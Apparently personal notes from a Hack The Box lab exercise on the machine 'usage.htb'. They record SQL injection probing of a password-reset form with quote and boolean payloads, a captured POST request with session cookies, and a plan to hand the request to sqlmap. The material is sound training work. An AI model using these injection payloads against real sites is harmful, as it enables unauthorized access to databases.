
created account
logged in
checked pages
logged out

![[Images/Pasted image 20240426001639.png|700]]

test@test.test'                          server error = sql injection
test@test.test' and 'a'='a          success
test@test.test' and @@version='a      success, would have failed for some sql versions
test@test.test

![[Images/Pasted image 20240426010352.png]]
if you change the last one to b you get a fail


reset password page - sql injection
```http
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6IlpIaWVFR3pTRDFWNEljUnV6UlNLbFE9PSIsInZhbHVlIjoibHRQNkh2bzJFMHRma1g5RzhnYVZsU0NlZndJYmwveUFIbGpGSlpaZzNSRVRrTzV1K21tOUkvd1Nhb3lzOWsvMWhjZ2dKa09mSGZpYXV3Mytwak9CK2w5b3VhRkJjdVB6aVNHSmExSGt1TTVxZWhRTHoyOUcwa291b1I1Y3ZwemkiLCJtYWMiOiI2NmRhYzViNjI1ZmQ3NWNiMTc2ODJlOGEyOTViNjBiZWE5NjhmMjEwOTgzOWRlNTE2NWUxM2I4ODgxNDFhNmQ1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlRQdWVSbTFsd1JCYWEvb2llSFhSM1E9PSIsInZhbHVlIjoiQVc4NW1NbUVjOW54QXNiODhhd2JGTUdlVnhLZ2J6ZW0wRXBpd1FqajV3enJVcHlPUnpna1hJaVpJVllTMmZqSDd3NkFwYjYxZVdNTTU4VW5WZm9qWW1aY2ZaSjhWNWNpNkZnMU8vdHdjTUdTVEVJcW4wK3ovTm1IdE1TS0RUVTAiLCJtYWMiOiIzMjcxZDM1YmNmMjFlMWE0YjBlMTVhYzM2ZWJkNGRjODEzNzgxYjNjODdmOTIzN2E5MzI4NTZkNjcxYzEyY2RmIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

_token=tvzDHT90bHURVbNB3X94WeliILj5EYxGZkbJEw30&email=test%40test.test
```

saving as request.txt
sending to sqlmap